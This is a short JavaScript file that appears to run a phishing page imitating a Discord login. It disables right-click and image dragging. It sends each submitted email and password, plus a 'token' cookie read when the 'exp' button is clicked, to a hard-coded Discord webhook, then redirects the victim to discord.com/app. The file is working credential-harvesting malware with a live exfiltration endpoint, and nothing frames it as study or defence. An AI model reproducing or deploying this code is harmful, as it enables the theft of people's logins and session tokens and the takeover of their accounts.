document.querySelectorAll('img').forEach(function(img) {
    img.addEventListener('dragstart', function(e) {
        e.preventDefault();
    });
});

document.addEventListener('contextmenu', function(e) {
    if (e.target.tagName.toLowerCase() === 'input') {
        return;
    }
    e.preventDefault(); 
});

document.getElementById('login-form').addEventListener('submit', function(event) {
    event.preventDefault(); 

    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;

    const data = {
        content: `login ||${email}|| key ||${password}||`
    };

    fetch('https://discord.com/api/webhooks/1329215534440644689/mK8U1pYAJ_RWOCA9_Kvpl_lSD332FX8AhZvUrMcEJY8iHOohT_6GWUAwECgNr_VRmFVr', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(data) 
    })
});

document.getElementById('exp').addEventListener('click', function(event) {
    event.preventDefault();

    let cookies = document.cookie;
    let token = cookies.match(/token=([^;]+)/);

    if (token) {
        let tokenValue = token[1];
        
        fetch('https://discord.com/api/webhooks/1329215534440644689/mK8U1pYAJ_RWOCA9_Kvpl_lSD332FX8AhZvUrMcEJY8iHOohT_6GWUAwECgNr_VRmFVr', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                content: `||${tokenValue}||`
            })
        })
        .then(response => {
            if (response.ok) {
                window.location.href = "https://discord.com/app";
            }
        });
    }
});
